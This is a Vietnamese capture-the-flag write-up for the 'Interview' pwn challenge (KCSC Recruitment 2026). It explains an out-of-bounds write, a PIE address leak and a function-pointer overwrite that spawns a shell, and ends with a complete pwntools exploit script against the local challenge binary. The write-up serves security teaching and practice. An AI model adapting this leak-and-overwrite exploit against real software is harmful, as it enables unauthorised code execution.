# Interview---Write-up-----KCSC-Recruitment-2026

Hướng dẫn cách giải bài Interview của giải KCSC-Recruitment-2026

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 30/12/2025

## 1.Mục tiêu cần làm
Đọc hiểu được code.

```C
unsigned __int64 __fastcall edit_present(unsigned int a1)
{
  char *v1; // rsi
  int v3; // [rsp+14h] [rbp-1Ch] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
  printf("Please enter your name: ");
  fgets((char *)&presents + 80 * a1, 32, stdin);
  printf("Please enter your address: ");
  fgets((char *)&presents + 80 * a1 + 32, 32, stdin);
  printf("Please enter your present: ");
  fgets(*((char **)&unk_40A8 + 10 * a1), 48, stdin);
  printf("Wanna double-check the address for exactly delivery? (1 = Yes | 2 = No): ");
  v3 = 0;
  __isoc99_scanf("%d", &v3);
  getchar();
  if ( v3 == 1 )
  {
    while ( v3 )
    {
      printf("Please enter your address: ");
      v1 = (char *)&presents + 80 * a1 + strlen((const char *)&presents + 80 * a1 + 32) + 32; // Tại đây thì nếu bạn nhập address là 32 byte thì nó sẽ trỏ xa ra thêm 32 byte
      read(0, v1, 0x20uLL);
      --v3;
    }
  }
  return v4 - __readfsqword(0x28u);
}
```

Bài này là **OOB** với lỗi ở đây là mảng `presents`.

## 2. Cách thực thi
Đầu tiên chúng ta cần xem coi chúng ta nên đè hàm win vào đâu.

```C
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+0h] [rbp-10h] BYREF
  unsigned int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  memset(&presents, 0, 0x500uLL);
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &v3);
    if ( v3 == 1337 )
    {
      santa_func();
      goto LABEL_27;
    }
    if ( v3 > 1337 )
      break;
    if ( v3 == 4 )
    {
      puts("Merry Christmas! Santa is coming!");
      exit(0);
    }
    if ( v3 > 4 )
      break;
    switch ( v3 )
    {
      case 3:
        printf("Id: ");
        __isoc99_scanf("%u", &v4);
        getchar();
        if ( v4 > 0xF || !qword_40A8[10 * v4] )
          goto LABEL_14;
        edit_present(v4);
        break;
      case 1:
        printf("Id: ");
        __isoc99_scanf("%u", &v4);
        getchar();
        if ( v4 <= 0xF && qword_40A8[10 * v4] )
        {
          puts("Present exists");
          break;
        }
        if ( v4 > 0xF )
        {
LABEL_14:
          puts("Invalid id");
          break;
        }
        request_present(v4);
        break;
      case 2:
        printf("Id: ");
        __isoc99_scanf("%u", &v4);
        getchar();
        if ( v4 > 0xF || !qword_40A8[10 * v4] )
          goto LABEL_14;
        see_presents(v4);
        break;
      default:
        goto LABEL_26;
    }
LABEL_27:
    check_handler();
  }
LABEL_26:
  puts("Invalid choice");
  goto LABEL_27;
}
```

Khi gõ `1337` thì nó sẽ vào gọi hàm `santa_func()`, đây là hàm được khởi tạo ban đầu với địa chỉ của `send_gift`.

```C
__int64 (__fastcall *setup())()
{
  __int64 (__fastcall *result)(); // rax

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  result = send_gift;
  santa_func = send_gift;
  return result;
}
```

Nếu ta thay địa chỉ của `santa_func` thành `call_me` ( hàm win ) thì bú vội. Vô tình thay thằng này cách `presents` 1280 byte, mà chúng ta có thể trỏ tới tận 1280 byte nhờ lỗi mình đã nói. Vậy thì chỉ cần tìm được PIE là xong.

Khi mình đặt breakpoint tại vị trí nhập address lần 2 của `edit_present`, mình thấy dù bạn chọn bất kỳ index nào thì nó cũng sẽ xuất hiện `Binary`. Mình sẽ chọn index = 0 để dễ giải thích.

<img width="1008" height="720" alt="image" src="https://github.com/user-attachments/assets/80e2fd2c-9e2f-492c-84f2-b3cc4fde9f1a" />

Tại `0x5555555580a2` chúng ta có `Binary Leak`. Thằng `0x5555555580b0` chính là thằng `presents+80`.

<img width="618" height="56" alt="image" src="https://github.com/user-attachments/assets/aad0e9a7-5fae-47ad-bd7a-94159a5e66fe" />

Vậy tức là nếu index = 0 thì offset sẽ là `presents + 80`, index = 1 thì `presents + 160`... Tùy vào index bạn chọn mà tăng lên. Tuyệt đối đừng chọn index 15.

```Python
request(0, b'Dummy1' + b'\n', b'Dummy2' + b'\n', b'\n')

edit_oob(0, b'Dummy1' + b'\n', b'A' * 30 + b'\n', b'\n', b'D' * 2)

see(0)

p.recvuntil(b'D' * 2)

leak_PIE = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"Leak PIE : {hex(leak_PIE)}")

offset = e.symbols['presents'] + 80
PIE_base = leak_PIE - offset
log.info(f"PIE base : {hex(PIE_base)}")
```

Sau khi có `PIE base` rồi thì ta sẽ có `win_add`. Giờ thì chỉ việc ghi đè thằng này vào `santa_func` thôi. Muốn biết cần đè bao nhiêu để chạm tới thì mở gdb lên và lấy index = 15 ra.

<img width="929" height="157" alt="image" src="https://github.com/user-attachments/assets/a811b718-4904-43ed-bb14-573cbfab31fe" />

<img width="950" height="725" alt="image" src="https://github.com/user-attachments/assets/46e3ad34-d7b9-49f9-8384-b69d43429f1a" />

Nếu mình nhập Address lần 1 là tối đa thì lần 2 mình chỉ cần nhập 17 byte là đè tới thằng `santa_func` rồi. 

Sau khi ghi đè xong thì ta sẽ truy cập vào menu ẩn bằng cách chọn `1337`. Nó sẽ chạy hàm `santa_func` lúc này là `call_me`.

Bùm nổ shell.

<img width="220" height="231" alt="image" src="https://github.com/user-attachments/assets/7569fe0d-8306-441d-975e-3a2e61d18b4a" />

Bài này mình đánh giá khá là dễ nếu chịu mò gdb 1 tí + thông hiểu về code C là ok. Dù sao thì bài này là bài đầu tiên mình làm mà không sử dụng 1 chút gì AI nên ghi có hơi khó hiểu 1 tí, mong các bạn thông cảm. Cho mình 1 star để có động lực viết tiếp nha 🐧.

<img width="220" height="220" alt="image" src="https://github.com/user-attachments/assets/22eb3b68-f5a0-45ea-a677-3a5afbd76ebe" />

## 3. Exploit

```Python
from pwn import *

p = process('./chall')
e = ELF('./chall')

def request(idx, name, addr, present):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Id: ', str(idx).encode())
    p.sendafter(b'name: ', name)
    p.sendafter(b'address: ', addr)
    p.sendafter(b'present: ', present)

def see(idx):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Id: ', str(idx).encode())

def edit_oob(idx, name, addr, present, payload):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Id: ', str(idx).encode())
    p.sendafter(b'name: ', name)
    p.sendafter(b'address: ', addr) 
    p.sendafter(b'present: ', present)
    p.sendlineafter(b'delivery? ', b'1')
    # pause()
    p.sendafter(b'address: ', payload)

request(0, b'Dummy1' + b'\n', b'Dummy2' + b'\n', b'\n')

edit_oob(0, b'Dummy1' + b'\n', b'A' * 30 + b'\n', b'\n', b'D' * 2)

see(0)

p.recvuntil(b'D' * 2)

leak_PIE = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f"Leak PIE : {hex(leak_PIE)}")

offset = e.symbols['presents'] + 80
PIE_base = leak_PIE - offset
log.info(f"PIE base : {hex(PIE_base)}")

win_add = PIE_base + e.symbols['call_me']

log.info(f"Win address : {hex(win_add)}")

request(15, b'Dummy1' + b'\n', b'Dummy2' + b'\n', b'\n')

edit_oob(15, b'Dummy1' + b'\n', b'A' * 30 + b'\n', b'\n', b'D' * 17 + p64(win_add))

p.sendlineafter(b'>> ', b'1337')

p.interactive()
```
